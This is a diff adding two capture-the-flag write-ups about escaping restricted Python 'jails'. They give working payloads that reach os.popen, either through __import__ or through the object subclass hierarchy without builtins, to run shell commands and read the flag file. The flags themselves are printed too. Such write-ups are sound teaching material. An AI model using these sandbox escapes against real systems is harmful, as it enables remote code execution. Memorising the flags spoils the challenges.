@@ -22,6 +22,73 @@
 
 ## Misc
 
+### Church of Emacs
+
+> halp hoaw 2 eksit vim :<  
+>
+> Author: Lucas
+
+---
+
+This challenge is meant to be a simple challenge that demonstrates the ability to get RCE even in one-liners. The
+exploit is simple, based on the built-in `__import__`.
+
+```py
+print(__import__('os').popen('cat flag.txt').read())
+```
+
+Flag: `ACSI{vivivi}`
+
+### Cult of vim
+
+> **Hard challenge!**
+>
+> I thought exiting Vim was hard enough... now I can't even exit Python??  
+>
+> Your goal is to get a shell, good luck!  
+>
+> Author: Lucas
+
+--- 
+
+Now, we don't have access to any built-ins at all, not even `exit` or `__import__`! In addition, there is a blacklist on
+numbers in our input... I wonder why?
+
+To solve the built-ins issue, we need to learn about Python object hierarchy. In Python, everything is an object,
+including seemingly simple things like strings and integers. This means that they all inherit from a base class which
+can be accessed if we have access to the object itself.
+
+Try this in your Python shell:
+
+```py
+''.__class__
+''.__class__.__base__
+''.__class__.__base__.__subclasses__()
+''.__class__.__base__.__subclasses__()[137].__init__.__globals__
+''.__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('ls').read()
+''.__class__.__base__.__subclasses__()[137].__name__
+```
+
+1. The string is of `<class 'str'>`
+2. `<class 'str'>` inherits from `<class 'object'>`
+3. `<class 'object'>` can access a list of subclasses, including a notable `<class 'os._wrap_close'>`, which comes from
+   the `os` module! On my system, this class is at index 137: try to find out what index it is on your system.
+4. I can access the global namespace of the `os._wrap_close` function. This is significant as it allows me to jump to
+   other functions like `popen`, which grants me RCE.
+5. This payload will allow me to get RCE.
+6. I can also access the name of the class (`"_wrap_close"`)
+
+Now we have our target! However, we can't input any numbers, so how do we access the index of `<class 'os._wrap_close'>`?
+
+We can use dictionary comprehension to convert the list into a dictionary and access the class by something that doesn't
+require numbers, like its name. Here is the full payload:
+
+```py
+{x.__name__: x for x in ''.__class__.__base__.__subclasses__()}['_wrap_close'].__init__.__globals__['popen']('cat flagcddecddecddecddecddecddecddecdde.txt').read()
+```
+
+Flag: `ACSI{:q_was_easier...}`
+
 ## Pwn
 
 ### Banana overflow
